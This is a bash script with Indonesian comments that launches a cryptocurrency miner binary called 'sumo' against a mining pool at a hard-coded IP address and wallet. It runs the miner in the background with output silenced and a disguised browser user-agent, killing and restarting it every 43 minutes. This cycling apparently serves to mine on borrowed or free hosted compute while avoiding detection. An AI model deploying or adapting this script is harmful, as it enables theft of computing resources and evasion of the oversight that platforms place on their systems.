#!/usr/bin/env bash

# Base folder
BASE_DIR="./sumo_dir"
mkdir -p "$BASE_DIR"

# Copy binary sumo
cp ./sumo "$BASE_DIR/sumo" 2>/dev/null || true
chmod +x "$BASE_DIR/sumo" 2>/dev/null

# Masuk ke folder
cd "$BASE_DIR" || exit 1

# Buat config.json
cat > config.json <<EOF
{
  "pools": [{
    "url": "128.199.191.7:443",
    "user": "v2df0zlb7dqvmbpr3uq7jbeaucbijily6cgcpl0ckswlh",
    "pass": "system",
    "tls": true
  }],
  "threads": 4,
  "user-agent": "Mozilla/5.0"
}
EOF

while true; do
  # Jalankan miner
  nohup ./sumo --config=config.json >/dev/null 2>&1 &

  start_time=$(TZ=UTC-7 date +"%R-[%d/%m/%y]")
  echo "[$start_time] ✅ STATUS: JALAN"
  echo "Process on (aktif 43 menit)..."

  sleep 2580  # 43 menit = 2580 detik

  # Matikan proses
  pkill -f "sumo"

  stop_time=$(TZ=UTC-7 date +"%R-[%d/%m/%y]")
  echo "[$stop_time] ⏸️  STATUS: MATI"
  echo "Process off (tunggu 1 menit)..."

  # Tunggu 1 menit
  sleep 60
done
